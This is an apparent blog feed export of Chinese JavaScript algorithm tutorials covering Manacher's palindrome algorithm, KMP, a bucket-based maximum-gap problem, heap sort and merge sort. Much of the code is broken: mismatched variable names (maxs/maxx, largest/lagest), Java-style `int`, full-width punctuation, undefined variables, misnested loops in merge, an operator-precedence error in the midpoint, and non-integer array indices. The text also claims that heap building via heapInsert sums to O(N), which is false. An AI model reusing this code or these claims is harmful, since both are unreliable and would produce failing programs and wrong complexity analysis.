    <content type="text"><![CDATA[Manacher在一个字符串里，怎么找到最长的回文子串，求它的长度？ 易混淆概念 回文：字符串的正序和逆序是一样的。 子串和子数组是连续的，子序列可不连续。例如abc的子串是ab，ac。子序列是ac。 最长的回文子串，例如abc12321de的最长回文子串是12321。 笨办法简述 从某一个位置，依次向两边扩。这样只能找到奇回文。即长度为奇数的回文。例如：abc12321de，你从3开始向两边扩，可以找到12321这样的奇回文。但是abc1221de，你是找不到1221这样的偶回文的。 笨办法（特殊字符处理） a12321b，处理为-a-1-2-3-2-1-b-。 a1221b，处理为-a-1-2-2-1-b-。 这样，我们以某一位置向两边扩，都可以找到回文。且不影响结果。 相当于对于偶回文，我们为它加了一个轴，让它有一个向两边扩的出发点。 我们增加的特殊字符，永远是和特殊字符比，不会和原字符串中的有效字符去比较。 笨办法时间复杂度 时间复杂度是O(n^2) 例如某个处理过的字符串长n，第一个位置扩0次，第二个扩2次。。。 扩的总次数 1 + 2 + 3 + … + n/2 + (n/2 - 1) + … + 1 。 所以总的时间复杂度是O(n^2) 回文半径从某个位置出发，它能够扩多远。 最右回文边界R “)”假设为最右回文边界， )-1-2-1-。一开始没扩，停留在最右边。 在0位置向两边扩，扩不动了。因为左边没东西。那么最右回文半径就来到了0位置。 在1位置向两边扩，扩了一个位置。即-1-。此时，最右回文边界来到了位置2。 在3位置向两边扩，即-1-2-1-。此时，最右回文边界来到了位置5，即字符串的最右边。 即最右回文边界表示，当前我扩到了哪个位置，忽略是哪个位置扩的，只管扩到的最右的位置。 C当我取得最右回文边界时，中心在哪，就是C。只有当R变化时，C才会变化。C和R一样，只记录最早的。当R更新时，即向右前进了，我们的C才会相应的更新。 arr字符串从首位置，从左往右依次扩。每个位置的回文半径我们都记在数组arr里。 ###做法 指针在字符串的某个字符上时，回文右边界未包括该字符，继续扩。例如：在一次扩的过程中，）8，回文右边界在8的左边，不包括8。 指针在字符串上的 I 位置，回文右边界 R 在 I 的右边，即包括 I 。那么 C 在 I 的左边是一定的。此时，我们也可以求得，以 C 为中心，R为右边界的对称的左边界L。I 作以C为参照物的对称点I’。 此时我们的拓扑结构是L I’ C I R。L和R之间是回文，且此时我们的I’点的回文半径，我们之前是求出来过的。 情况一：i’的回文半径在[L, R]内，此时I的回文半径与i’的回文半径相同。 情况二：i’的回文半径有部分在[L,R]之外，此时I的回文半径是I到R这一部分[I, R]，长度等于[L, I’]。 情况三：i’的回文半径正好在L上，此时无法确定I的回文半径是否能超过R。只能去扩，去试。 情况总结 情况一：I在R的右边（[L,R]范围外），无法加速，扩。 情况二：I在R的内部，I’的回文半径在L内，不需要扩，I的回文半径与I‘的回文半径相等。 情况三：I在R的内部，I’的回文半径有一部分在[L，R]内，不需要扩，I的回文半径是I到R。 情况四：I在R的内部，I’的回文半径在L上（压线），扩，但是I到R的部分一定是回文，这一部分就不需要扩了。从R位置扩就好。 时间复杂度估计 情况二和情况三，因为I的回文半径是确定的，所以时间复杂度是O(1)。 情况一和情况四，如果能扩，R一定会向右走。R只增大不减小，R最多向右边移动多少呢？N。所以时间复杂度是O(N) 所以整个算法的时间复杂度是O(N)。 代码1234567891011121314151617181920212223242526272829303132333435363738function maxLcpsLength (str) &#123; if (!str || str.length === 0) &#123; return 0 &#125; // 处理成manacher字符串 let charArr = manacherString(str) let C = -1 // 最右回文边界 let R = -1 let max = Number.MIN_SAFE_INTEGER for (let i = 0; i != charArr.length ; i++) &#123; // 情况二和情况三 I 的回文半径已知，实际上是不需要扩的，但是code中，我们给出 I 的回文半径，让I在这个基础上扩一扩试试。 // 即我们求出 I 位置的回文半径起码是多远.然后用while循环在这个基础上扩 // pArr[2 * C - i]，对称点的回文半径 // Math.min(pArr[2 * C - i], R - i)，整合了i&apos;在R内的情况，谁短谁是最起码的回文半径 pArr[i] = R &gt; i ? Math.min(pArr[2 * C - i], R - i) ： 1 // 条件 ：i + pArr[i] &lt; charArr.length &amp;&amp; i - pArr[i] &gt; -1 判断在 I 位置扩的时候，新的回文左边界和右边界是否数组越界 while (i + pArr[i] &lt; charArr.length &amp;&amp; i - pArr[i] &gt; -1) &#123; // while循环，针对情况二和情况三是不需要扩的。在第一次循环就会不满足条件，以至于break // 针对情况一，情况四，都在最起码的回文范围上，继续暴力扩 // 因此，针对情况一二三四统一写成一下代码 // 条件：charArr[i + pArr[i]] === charArr[i - pArr[i]，左边界等于右边界，回文半径增加。不等 break if (charArr[i + pArr[i]] === charArr[i - pArr[i]]) &#123; pArr[i]++ &#125; else &#123; break &#125; &#125; // 如果最右回文边界被我推得更远了，记录一个新的R和C if (i + pArr[i] &gt; R) &#123; R = i + pArr[i] C = i &#125; // 每次记录最大回文半径 max = Math.max(max, pArr[i]) &#125; return max - 1&#125; 扩展一个字符串，只能在后面增加字符，让它变成回文串。还要让增加的字符最少。如何做？ 这道题变为，必须包含最后一个字符的情况下，最长回文子串的长度是多少？ 举个例子：原字符串abc12321，必须包含最后一个字符的情况下，最长回文子串是12321，前面不是的部分，逆序添加到末尾。即abc12321cba。添加的cba是最短的。 manacher算法逐渐向右扩展的时候，第一次R到达结尾的时候，停止。我们知道R在哪，C在哪，因此我们就知道L在哪。我们把L之前的子串，逆序放到末尾。得出结果。即改写了manacher算法。]]></content>
      <categories>
        <category>JavaScript经典算法</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript经典算法--KMP算法应用（二）]]></title>
    <url>%2F2017%2F12%2F19%2FJavaScript%E7%BB%8F%E5%85%B8%E7%AE%97%E6%B3%95--KMP%E7%AE%97%E6%B3%95%E5%BA%94%E7%94%A8%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[KMP算法应用（二）如何判断一棵树，它子树的某一个结构，是另外一个树的结构。例如。树1：1234567 与树2：367。树1的子树367与树2一样。 常规做法暴力尝试每一个开头，并以第二棵树的方式去遍历。如果一个开头能以第二棵树的方式遍历出来，即每个支点的值一样。 二叉树序列化（作为字符串）每个值后跟-，空值视作#并也跟-。例如123，序列化后就是1-2-#-#-3-#-#-。 二叉树反序列化 1-2-#-#-3-#-#-。很容易可以看出来树是123。 内存中的树，序列化后持久化存在硬盘中。再从硬盘中反序列化到内存中。 不用特殊符号表示空和一个数的结尾，反序列化就会乱。比如111，你根本不知道是啥结构。 序列化的信息既代表了这个树的值信息，也代表了这个树种的结构信息。 本题解法将A树序列化为strA，B树序列化为strB。用KMP，strA中包含strB，那么A这棵树一定包含B这棵树。]]></content>
      <categories>
        <category>JavaScript经典算法</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript经典算法--KMP算法应用（一）]]></title>
    <url>%2F2017%2F12%2F19%2FJavaScript%E7%BB%8F%E5%85%B8%E7%AE%97%E6%B3%95--KMP%E7%AE%97%E6%B3%95%E5%BA%94%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[KMP算法应用（一）有一个字符串，经过处理，包含两个自己，且开始的位置不一样。怎么添加字符最短？例如：原字符串是aaa，处理过后是aaaa，包含两个aaa。 实质元字符串处理完成后，最大前缀和最大后缀是贴在一起的，例如aaaaa的最大前缀是aaaa不包含最后一个a，最大后缀是aaaa不包含首位置的a。即：这个题目就变成了，原字符串的最大前缀和最大后缀重合多少，不重合的部分添在原字符串的后面即可。例如：abcabc-，-位置的最大前缀和最大后缀的部分匹配值是3。只需要在原字符串后添加2位置后的字符串即可。即在abcabc后再添加一个abc，]]></content>
      <categories>
        <category>JavaScript经典算法</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript经典排序算法--KMP]]></title>
    <url>%2F2017%2F12%2F13%2FJavaScript%E7%BB%8F%E5%85%B8%E7%AE%97%E6%B3%95--KMP%2F</url>
    <content type="text"><![CDATA[KMP 复杂度是O(N) 有str1，str2两个字符串，求st1里面是否包含str2?且返回str2的位置。例如：str1是abc123def，str2是123，如果包含 f1(str1, str2 ) = 3。如果str1 不包含 str2，那么 f1(str1, str2) = -1 笨办法 str1 长度为N，str2 长度为M 从 str1 的0位置开头，配str2 从 str2 的1位置开头，配str2 最差的情况尝试str1每一个位置为开头，且每一轮都配M次，这个时间复杂度为O(N * M) 前缀与后缀 我要建立基于 str2 字符串的一组信息。叫做：最大前缀和最大后缀的部分匹配值。 前缀不能到最后一个字符，后缀也不能到第一个字符。 例如：str2是abcabcd。我们生产一个next数组，数组长度和str2的长度一样。next数组的值是什么？ 对于str2的 a，a的前面没有字符串，那么对应的next数组上的值是 - 1。 对于str2的 b，b的前缀不能到第一个字符，那么对应的next数组上的值是 0。 即对于str2 的 0位置，1位置。next数组上的值时-1 和 0。 以上是 0，1位置在next数组中的对应值，对于普遍位置来说，引入最大前缀和最大后缀的部分匹配值。 “最大前缀与最大后缀部分匹配值”的概念str2 是 abcabc | d 对于d，以1为单位。前缀是a，后缀是c。不匹配。 对于d，以2为单位。前缀是ab，后缀是bc。不匹配。 对于d，以3为单位。前缀是abc，后缀是abc。匹配。 对于d，以4为单位。前缀是abca，后缀是cabc。不匹配。 对于d，以5为单位。前缀是abcab，后缀是bcabc。不匹配。那么最大前缀和最大后缀是5时，部分匹配值是3，d对应的next数组中的值为 3。这是next数组中数的意义，是最大前缀与最大后缀部分匹配值。 next数组匹配方法 对于str2上的每一个字符，我们根据next数组，有了其最大前缀和最大后缀部分匹配值。 即最大前缀和最大后缀中存在长度为k的相同前缀和后缀,这个值就存在next数组中，表示Str2每个位置的k值。 对于字符串转化的数组P的q位置的匹配值：next[q] = k 。表示P[q]之前的子串中，存在长度为k的相同前缀和后缀 举例：对于str1：1234abc1234k 与 str2：1234abc1234a。根据next数组，其最大前缀与最大后缀匹配。第一次配型时，从1开始配，str1与str2比较到a这个位置时，配型失败。那么第二次配型就没必要从2开始配了。从第二个1234开始配，看k和a是否相等即可。 这样就加速了 笨方法配型。 next数组加速配型的实质对于str1：1234abc1234k 与 str2：1234abc1234a。我们抛弃了k之前的字符串，将str2往后推，让1234k与1234a比较。因为1234相等，所以看k和a即可。 next数组加速配型的原因反证法：对于str1：1234abc1234k 与 str2：1234abc1234a。如果k之前的字符串中，一个随机的位置开始，能和str2匹配上。那么，我们之前求得的next数组的最大前缀和最大后缀匹配就不成立了。因为会有一个更大的最大前缀和最大后缀匹配。 next数组加速配型的时间复杂度对于str1：…M 与 str2：…。有两个相斥的行为，以str1是否移动为分界。一是：str1是一个一个往后滑，最多滑str1的长度，是O(N)。二是：str2在str1不滑动时，滑到最大前缀和最大后缀匹配位置，最多滑str1的长度，是O(N)。整体2O(N)，即O(N)。 next数组加速配型代码过程12345678910111213141516171819202122232425262728293031function getIndexOf (s, m) &#123; if (s === null || m === null || m.length &lt; 1 || s.length &lt; m.length) &#123; return -1 &#125; // 构造字符串数组 let str1 = s.split(&apos;&apos;) let str2 = m.split(&apos;&apos;) // 两个指针分别用于str1和str2的字符串比较 let i1 = 0 let i2 = 0 // 得到str2的next数组 let next = getNextArray(str2) // 利用next数组加速比较过程 while (i1 &lt; str1.length &amp;&amp; i2 &lt; str2.length) &#123; // 比较 if (str1[i1] === str2[i2]) &#123; // 该位置上字符相等，两个指针均向后移动 i1++ i2++ &#125; else if (next[i2] === -1) &#123; // next数组中 -1 表示 i2指针指向了字符串的首位，且此时i1指向的字符和i2指向的字符不等，i1指针向后推 i1++ &#125; else &#123; //此时i1指向的字符和i2指向的字符不等。再次比较时，i2指到next数组中的最大前缀与最大后缀匹配的位置，再与i1比较。 //即next数组帮助指针忽略了最大前缀个位置，直接比较最大前缀的下一位。这样就不需要再从str2的零位置与str1的i1位置一个一个苦苦比较了。 i2 = next[i2] &#125; &#125; // 当i2指向str2的末尾时，即i2到了边界，我们已经在str1上配出来一个str2了，比较完成。如果循环结束还没指向末尾，则str1里找不到str2的匹配，返回一个-1。 return i2 === str2.length ? i1 - i2 : -1&#125; next数组求解代码过程 我们要知道，next数组上存的值，最大前缀和最大后缀的部分匹配值。 我想求str2上i位置的next数组值，那么我们i - 1位置上的next数组的值一定是已经求出来的。 设 i - 1 为 b ，设 i 为a。 b 的indexPreB（最大前缀部分匹配值的位置） + 1 和 b的 indexSuffixB（最大后缀部分匹配值的位置） + 1 就是 a 的最大前缀部分匹配值的位置和 a 的最大后缀部分匹配值的位置。不过，需要判断一下，也有可能不是。 如果是，那么indexB + 1 位置的值与 b 位置的值相等。 如果不是，则不相等。设 b 的indexPreB（最大前缀位置） + 1位置是 c 。 求 c 的next数组值，即想要知道他的最大前缀和最大后缀匹配值(长度为k的相同前缀与后缀)。看 c 的最大前缀部分匹配值的位置的下一个位置与 c 本身是否相等。相等，则就求出了 a 的next数组值。 不相等，重复上过程。 跳到 - 1了，那么next数组的值便是0了。123456789101112131415161718192021222324252627function getNextArray (str2) &#123; if (str2.length === 1) &#123; return [-1] &#125; let next = [] next[0] = -1 next[1] = 0 let i = 2 // cn是上述过程中用于比较的值的指针，指针指向最大前缀位置的下一个位置。 // 第一次比较时，cn表示next数组中的值是0，即1位置不存在长度为k的前后缀。 let cn = 0 while (i &lt; str2.length) &#123; // 如果我 i - 1 位置的字符，与你跳到的位置相等，那么next数组的值便是 i - 1 位置next数组的值 + 1。（） if (str2[i - 1] === str2[cn]) &#123; next[i++] = ++cn &#125;else if(cn &gt; 0) &#123; //没配上，cn向前跳 cn = next[cn] &#125;else &#123; //cn跳到0位置了，还没配出最大前缀和最大后缀 next[i++] = 0 &#125; &#125; return next&#125; next数组求解过程的时间复杂度 假设str2的长度是m 设一个指针为i，一个是i - cn i 最大范围是m，i - cn 最大值也是m（cn可以跳到0，表示无最大前后缀） next[i++] = ++cn，i会上升，i - cn 不变 cn = next[cn]，i不变, i - cn 上升 next[i++] = 0, i上升， i - cn 上升 while过程中，要么i上升，要么i -cn上升，要么都上升，所以while过程执行的次数不会大于 2*M 所以时间复杂度为O(M) 时间复杂度 主过程： i 动，i 最多到N i不动，str2右移动，也最多str1长度N这个范围 即，我们常数操作绑定在了N这个变量上。 next数组过程：i 和 i - cn 去衡量这个常数操作过程的时间复杂度 所以总的时间复杂度是O(N)]]></content>
      <categories>
        <category>JavaScript经典算法</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript经典算法--桶排序扩展题目]]></title>
    <url>%2F2017%2F12%2F08%2FJavaScript%E7%BB%8F%E5%85%B8%E7%AE%97%E6%B3%95-%E6%A1%B6%E6%8E%92%E5%BA%8F%E6%89%A9%E5%B1%95%E9%A2%98%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[桶排序扩展题目一个无序数组，如果有序之后，求相邻数组之间的最大差值？要求：不能使用O(n^2)的排序。 方法概述 有 N 个数，就准备 N + 1 个桶。 求出最大值和最小值的差值：max - min 。 将这个差值在N+1个桶上均分，每个桶放自己范围的数。这个范围记为range。例如有1，2，3。差值是 2/3，则第一个桶放 [1, 1+ 2/3] 大小的数。 最小值放在最左边的桶，最大值放在最右边的桶里。因此一定有一个桶是空桶。 空桶的左边找一个最近的非空桶，右边也找一个。 空桶左边的非空桶中最大的数，和空桶右边的非空桶中最小的数，是相邻的。 空桶左边的非空桶中最大的数 - 空桶右边的非空桶中最小的数 一定大于我们上面记下的 range ，因为空桶本身也有一个range。 我们这么做的目的：相邻数可能来自桶内部，也可能来自桶与桶之间。但，因为有这么一个空桶，所以我们可以证明：我们可以忽略一个桶内的相邻数，因为桶内部的相邻数的差是 &lt;= range 的。我只用关心两个桶之间的差值。 因此，我们的桶没必要搜集所有的数。桶只需要搜集，进入这个桶的最大值和最小值。 问题就变成了：这个数组中的数进桶，更新桶的最大值和最小值。桶进过数是true,没进过是false. 我们的答案一定来自于两个桶之间的差值，非空桶只是为了证明，答案一定不来自于桶的内部。相邻的非空，所有的max - min，算一遍。求最大差值。 整个过程严格 O(N)。 关键代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152function maxGap (nums) &#123; let len = nums.length let min = Number.MAX_SAFE_INTEGER let max = Number.MIN_SAFE_INTEGER // 找数组中的最大值和最小值 for (let i = 0; i &lt; len; i++) &#123; min = Math.min(min, nums[i]) max = Math.max(max, nums[i]) &#125; // 如果min和max相等，相当于数组中都是一个数 if (min === max) &#123; return 0 &#125; // 做三个数组。一个是统计每个桶是否为空，一个是统计每个桶的最大值，一个是统计每个桶的最小值 // 即三个数组，表示3个维度的事情。 let hasNum = [] let maxx = [] let mins = [] // 几号桶？ let bid = 0 // 这个for循环用于建立所有的桶信息 for (int i = 0; i &lt; len; i++) &#123; // 确定num[i]进的是几号桶 bid = bucket(nums[i], len, min, max); // 确定bid号桶的最小值 mins[bid] = hasNum[bid] ? Math.min(mins[bid], nums[i]) : nums[i]； // 确定bid号桶的最大值 maxs[bid] = hasNum[bid] ? Math.max(maxs[bid], nums[i]) : nums[i]); // 确定桶是有值的 hasNum[bid] = true; &#125; let res = 0 let lastMax = maxs[0] let i = 1 for (; i &lt;= len; i++) &#123; if (hasNum[i]) &#123; // 每一个桶的最小值都去找上一个桶的最大值 res = Math.max(res, mins[i] - lastMax); lastMax = maxs[i] &#125; &#125; // 这就是相邻最大差值 return res&#125;// 计算数字num进几号桶function bucket (num, len, min, max) &#123; return ( ((num - min) * len / (max - min)) | 0 )&#125; 小贴士基础类型对稳定性不看重，所以用不稳定但是快的。而自己定义的类，是看重稳定的(mergesort)。]]></content>
      <categories>
        <category>JavaScript经典算法</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript经典排序算法--堆排序]]></title>
    <url>%2F2017%2F12%2F07%2F%E5%A0%86%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[堆 时间复杂度是O(N * logN)，额外空间复杂度O(1)，实现不能做到稳定性 关键步骤：heapInsert，heapify，堆的扩大和缩小操作 注意：1. 堆排序中，建立堆的操作O(N)。2. 堆排序的核心数据结构：堆，也可以说是优先级队列。 描述 堆是一棵完全二叉树结构。什么是完全二叉树？即结构是永远是在成为满二叉树的路上或已经成为完全二叉树了。 数组下标与完全二叉树是有逻辑对应的： 在数组上，i 的左孩子的下标：2 * i + 1 i 的右孩子的下标是：2*i + 2 i 的父节点下标是：( i - 1) / 2 即在数组上我们可以找到一个节点的父节点 以及 左右孩子。 大根堆 概念：1. 大根堆一定是完全二叉树结构。2. 在大根堆中，任何一个节点，都是它下面的整棵树中（包括它自己的那颗树，即以它为头的树），最大的节点。 堆排首先要将一个数组变成大根堆做法是：1. 对每一个数，看它是否比它的父节点大。大就与父节点交换位置。2. 交换位置后，再看它是否比它的父节点大，大就再交换位置。3. 直到它不再比它的父节点大。 这样一个大的数再加入二叉树时，会把比它小的父干掉。如此调出来的，一定是一个大根堆。 关键代码 – heapInsert（调大根堆的过程）这里解释我们排序思想的关键部分，详细代码请见我的GitHub12345678910111213// 数组一上来，我们考察它的每一个位置，将这个数组调成一个大根堆，这个方式简称为heapInsert// 数组上的一个元素，往上看，它比它的父大，就换。换完再往上看，重复上过程。// 如此heapInsert，调成大根堆function heapInsert(arr, index) &#123; // 这里 “arr[index] &gt; arr[(index - 1) / 2”考虑到了两个关系 // 1.我是否比我的父要大 // 2.我到了二叉树的定点，即数组的 0 位置。 （负数 / 2 = 0），我也不满足循环，停止。 while ( arr[index] &gt; arr[(index - 1) / 2] ) &#123; swap(arr, index, (index - 1) / 2) index = (index - 1) / 2 &#125;&#125; 关键代码 – heapInsert 的时间复杂度 完全二叉树如果有 i 个节点，它的高度是 log(2， i)。例如 7 个节点， 3层。 1.当1个节点时，heapInsert的代价是log1。2.当2个节点时，heapInsert的代价是log1 + log23.当n个节点时，heapInsert的代价是 log1 + log2 + log3 + … + logN ，收敛在O(N)4.即建大根堆的过程时间复杂度是 O(N) 在已知大根堆的基础上排序 1.在大根堆上，已知堆顶元素是最大值。将这个值放在最后的位置上。2.将最后位置上的值放在头部。3.此时，最后一个位置上的数就排好了。4.拿掉此时，最后一个位置上的数。 如何 拿掉此时，最后一个位置上的数？用size表示堆的边界，左孩子或者右孩子大于size，即它的左孩子和右孩子不在堆上。因为 我们将 size - 1 ，表示拿掉了此时，最后一个位置上的数。但是，此时 size - 1 大小的堆，不能保证它是大根堆了！ 因为我们上述1，2，3过程破坏了大根堆。所以我们的堆顶要下沉！它与它的左孩子和右孩子比较，它与最大的孩子比较，小于最大的孩子，就下沉。然后，它与此时它的左孩子和右孩子比较，重复上过程。成为大根堆。 再次进行1，2，3过程。每一轮成为大根堆后，都将堆顶和堆的最后一个元素交换位置。然后将堆的大小减少 1。调整头部，看它沉在哪。 反复过程，直到整个堆的size 减完，整个数组有序了。 在大根堆的基础上排序–heapify 代码12345678910111213141516171819202122232425// 从index位置开始往下沉，堆的大小是size// heapify可以调节任何位置，从任何位置往下沉function heapify (arr, index, size) &#123; // 先求左孩子下标 let left = index * 2 + 1 // 循环条件：左孩子的下标是否越界(左孩子越界则右孩子一定越界) while (left &lt; size) &#123; // 如果我的左右两个孩子都有，那么我选择两个孩子中，大的一个作为我lagest变量的值。 let lagest = left + 1 &lt; size &amp;&amp; arr[left + 1] &gt; arr[left] ? left + 1 : left // 较大的index 孩子的值，是否比我的值要大，大则lagest的值是较大孩子的Index；否则，lagest的值是我自己的Index lagest = arr[lagest] &gt; arr[index] ? lagest : index // 如果这个最大值的 lagest 就是我，又因为我在大根堆中，所以我比以我为头的树中的所有的值都大，所以过程停止，不动。 if (largest === index) &#123; break &#125; // 下沉，与较大的那个孩子交换 swap(arr, largest, index) // 我来到了孩子的位置 index = largest // 此时，我的左孩子又向下的一层 left = index * 2 + 1 &#125;&#125; 往返以上代码描述的过程！ 总的代码流程1234567891011121314// for循环将每个节点去建大根堆for (let i = 0; i &lt; arr.length; i++) &#123; heapInsert(arr, i)&#125;// 将0位置（堆顶位置）换到我的最后一个位置let size = arr.lengthswap(arr, 0, --size)// 此时不是大根堆了，我们就去heapifywhile(size &gt; 0) &#123; heapify(arr, 0, size) // heapify后又是大根堆了，我们再将堆顶和末位交换位置 swap(arr, o, --size)&#125;// 一直往复直到整个堆减完（size = 0），堆排序结束 关键点 堆排序引入了堆这种结构 堆排序的两个过程：建立堆和任何一个位置下沉调整的过程 size– ，保证不越界 时间复杂度因为heapInsert的时间复杂度是O(N)；而heapify是一个下沉的过程，其下沉的高度最多是logN级别的；所以说时间复杂度是O(N * logN) 额外空间复杂度–O(1) 一个数 i 是用公式找到左孩子和右孩子 快排中，断点的位置每一次都是用一个变量记录的，这样我们才能知道左右递归的范围。这样也导致，快排的额外空间省不掉的。 可以看出来，堆排所有需要排列的位置都是公式告诉我们的。 但是，堆排的常数项大，我们的指标是O(N * logN)，但是实际运行中，快排的常数项十分小。]]></content>
      <categories>
        <category>JavaScript经典算法</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript经典排序算法--归并排序的扩展]]></title>
    <url>%2F2017%2F12%2F04%2F%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F%E7%9A%84%E6%89%A9%E5%B1%95%EF%BC%88%E5%B0%8F%E7%9B%92%E9%97%AE%E9%A2%98%EF%BC%89%2F</url>
    <content type="text"><![CDATA[归并排序的扩展（小盒问题）什么是小盒问题？[3, 5, 1, 4, 6]。3的左边比3小的是0；5的左边比5小的是3；1的左边比1小的是0；4的左边比4小的是3；6的左边比6小的是3、5、1、4。那么小盒为0 + 3 + 0 + 3 + （3 + 5 + 1 + 4） = 20。即每个数的左边比它本身小的数的值累加起来。 笨方法看每个数左边有哪些比它小的数，累加起来。是一个时间复杂度为O(n ^ 2) 的问题。 改写归并排序解小盒问题 – 举个例子： 例子1：[3,4,5,2,6,7] =&gt; 3 | 4 | 5 | 2 | 6 | 73 | 4 merge =&gt; 产生小盒 334 | 5 merge =&gt; 产生小盒 4 5 由例子1 引出 例子2：3 4 5 6 | 7 8 9 10 ，两组数 merge 两组数merge，因为3 比 7 小，所以3 一定比4个数小！因此有一个小盒是 4 * 3 此时放入help[]数组中一个3 即整个问题变成了看看在merge的过程中，看左边与右边比较时，右边有多少个比左边的这个数大。就有多少个小盒，就可求值。 上述做法正确的原因？在每一次merge的时候，两个数字比较之后会放在同一区域内，下一次不会再相遇。 关键代码123456789101112131415161718192021222324252627282930function mergeSort (arr, l, r) &#123; if (l === r) &#123; return 0 &#125; let mid = l + (r - l) &gt;&gt; 1 //左边的小盒 + 右边的小盒 + 整个的小盒 return mergeSort(arr, l, mid) + mergeSort(arr, mid + 1, r) + merge(arr, l, mid, r)&#125;function merge(arr, l, mid ,r) &#123; let help = [] let i = 0 let p1 = l let p2 = m + 1 let res = 0 while(p1 &lt;= m &amp;&amp; p2 &lt;= r) &#123; //如果右边的比左边的大，那有右边有多少个比左边的大，就有多少个小盒 res += arr[p1] &lt; arr[p2] ? (r - p2 + 1) * arr[p1] : 0 help[i++] = arr[p1] &lt; arr[p2] ? arr[p1++] : arr[p2++] &#125; while(p1 &lt;= m) &#123; help[i++] = arr[p1++] &#125; while(p2 &lt;= r) &#123; help[i++] = arr[p2++] &#125; for (i = 0; i &lt; help.length; i++) &#123; arr[l + i] = help[i] &#125;&#125; 扩展2：逆序对问题 什么是逆序对问题？在一个数组中，存在多少对，前面的数比后面的数大？例如：[4, 3, 5, 7, 0]，4和3，4和0，3和0，5和0，7和0是一对。 所以逆序对问题是：右边有多少个数比自己小？本质和小盒问题是一样的。]]></content>
      <categories>
        <category>JavaScript经典算法</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript经典排序算法--归并排序]]></title>
    <url>%2F2017%2F12%2F04%2F%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[归并排序时间复杂度O(N * logN)，额外空间复杂度O(N)，实现可以做到稳定性。 ###例子简而言之，是将有序小数组，merge成大的有序数组的过程。举个例子，数组[1,3,2,4] 第一步分为[1, 3]和[2, 4] 第二步分为1，3，4，2 第三步有序合并 [1, 3] 和 [2, 4] 第四步再次有序合并[1, 2, 3, 4] 最终数组有序 归并排序过程及代码这里解释我们排序思想的关键部分，详细代码请见我的GitHub1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556function mergeSort (arr, l, r) &#123; //递归跳出条件，只剩下一个数，即l = r if (l === r) &#123; return &#125; //找中间位置做划分点 let mid = l + ((r - l ) &gt;&gt; 1) //递归在不满足条件时，会中断跳出 //对左半边部分做递归，即递归的左子过程 mergeSort(arr, l, mid) //对右半边部分做递归，即递归的又子过程 mergeSort(arr, mid + 1, r) //merge过程 //merge过程同上述例子，左半边和右半边进行有序合并 merge(arr, l, mid, r)&#125;function merge(arr, l, m, r) &#123; //辅助数组 let help = [] //辅助指针 let i = 0 //左半部分指针 let p1 = l //右半部分指针 let p2 = m + 1 //当左半部分数组和右半部分数组都有元素时 while (p1 &lt;= m &amp;&amp; p2 &lt;= r) &#123; //arr[p1]与arr[p2]哪个小，就先填写在辅助数组上,同时指针向后移一位 help[i++] = arr[p1] &lt; arr[p2] ? arr[p1++] : arr[p2++] //当只有左半部分数组有值时 while (p1 &lt;= m) &#123; help[i++] = arr[p1++] &#125; //当只有右半部分数组有值时 while (p2 &lt;= r) &#123; help[i++] = arr[p2++] &#125; //复制回原数组 for (i = 0; i &lt; help.length; i++) &#123; arr[l + i] = help[i] &#125; &#125;&#125; 时间复杂度T(n) = 左右两部分递归 2T(n/2) + merge的过程 O(n)，所以时间复杂度为O(n * logn) 系统递归压栈的过程 f1( )调用 f2( ) f2( )调用 f3 () f3( ) 退出 , 接着调用 f4( ) f4( )退出， 调用 f5 ( ) f5( ) 退出，，f3( )退出，f2( ) 退出， f1 ( ) 退出 系统怎么做这个过程呢？ 压栈:指的是系统将函数的所有现场信息，记录在一个栈里. 系统将f1压栈 =&gt; 将f2压栈 =&gt; 将f3压栈 =&gt; f3弹出 =&gt; f4压栈 =&gt; f4弹出 =&gt; f5压栈=&gt;f5弹出 =&gt; f3弹出=&gt; f2弹出 因此递归是可以改成非递归的，你不使用系统帮你压栈即可。 为什么说工程上尽量不使用递归排序呢？1.准备一个函数并运行它是十分消耗资源的2.在递归压栈的过程中，系统会帮你把函数的所有信息都保存。而我们在业务中，不一定需要那么多的信息。3.系统的栈是有限制的。 额外空间复杂度 因为在merge的过程中，需要一个额外的数组，所以额外空间复杂度是O(n) 是否存在额外空间复杂度为O(1)的？网上的为原地归并排序，但时间复杂度从O(N * logN) 变成了 O(N ^ 2)，不对。 内部缓存法可以正确降低额外空间复杂度。]]></content>
      <categories>
        <category>JavaScript经典算法</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript经典排序算法--快速排序]]></title>
    <url>%2F2017%2F12%2F01%2F%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F%2F</url>
